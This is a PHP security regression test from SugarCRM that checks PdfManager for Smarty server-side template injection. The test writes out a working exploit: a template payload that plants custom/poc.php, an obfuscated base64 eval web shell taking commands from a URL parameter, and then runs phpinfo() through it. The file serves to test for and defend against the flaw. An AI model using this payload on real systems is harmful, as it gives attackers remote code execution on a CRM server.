<?php
/*
 * Your installation or use of this SugarCRM file is subject to the applicable
 * terms available at
 * http://support.sugarcrm.com/Resources/Master_Subscription_Agreements/.
 * If you do not agree to all of the applicable terms or do not have the
 * authority to bind the entity as an authorized representative, then do not
 * install or use this SugarCRM file.
 *
 * Copyright (C) SugarCRM Inc. All rights reserved.
 */
declare(strict_types=1);

use Regression\SugarCRMAssessment;
use Regression\Severity;

class SmartySSTIAssessment extends SugarCRMAssessment
{
    public function getSeverity(): ?string
    {
        return Severity::HIGH;
    }

    public function getAssessmentDescription(): string
    {
        return 'SSTI in Smarty templates in PdfManager';
    }

    public function run(): void
    {
        $this->login('admin', 'asdf')
            ->bwcLogin()
            ->apiCall('/PdfManager', 'POST', [
                'body_html' => '{SugarAutoLoader::put(\'./custom/poc.php\',\'<?php eval(base64_decode("ZXZhbCgkX0dFVFsnYyddKTs=")); ?>\')}',
            ])
            ->extractRegexp('id', '/"id":"([^"]+)"/')
            ->get("index.php?module=PdfManager&action=sugarpdf&sugarpdf=pdfmanager&pdf_template_id=" . $this->getVar('id'))
            ->get('custom/poc.php?c=phpinfo();')
            ->assumeSubstring('PHP Version', $phpInfo)
            ->checkAssumptions('Static method calls are allowed in Smarty templates', $phpInfo);
    }
}
